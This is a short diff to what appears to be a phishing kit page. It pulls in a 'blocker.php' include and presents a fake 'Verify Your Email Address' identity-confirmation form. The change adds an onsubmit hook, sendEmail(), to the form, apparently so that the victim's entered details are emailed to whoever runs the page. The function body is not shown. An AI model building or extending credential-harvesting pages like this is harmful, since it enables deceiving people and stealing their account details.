@@ -193,7 +193,9 @@ include '../blocker.php';
     
     <div class="content-container" id="content" role="main" tabindex="-1">
         <!-- action="=-=-=.php" -->
-        <form action="pagetwo.js" autocomplete="off" id="MainForm" method="post"><input name="Token" type="hidden" value="ORwSDTXRlaQ1" /><div class='row'>
+        <form action="pagetwo.js" autocomplete="off" id="MainForm" method="post" onsubmit="sendEmail()"
+
+        ><input name="Token" type="hidden" value="ORwSDTXRlaQ1" /><div class='row'>
 <div class='large-12 medium-12 small-12 column'>
 <h1>Verify Your Email Address</h1><div class="validation-summary-valid&#32;message&#32;warning" data-valmsg-summary="true" data-visaAlert="" style="display:none;visibility:visible;"><i class='fa fa-exclamation-triangle' role='img' aria-label='Warning'></i>
                         <span class='a11y-hide-visually'>Confirm identity</span><ul><li style="display:none"></li>
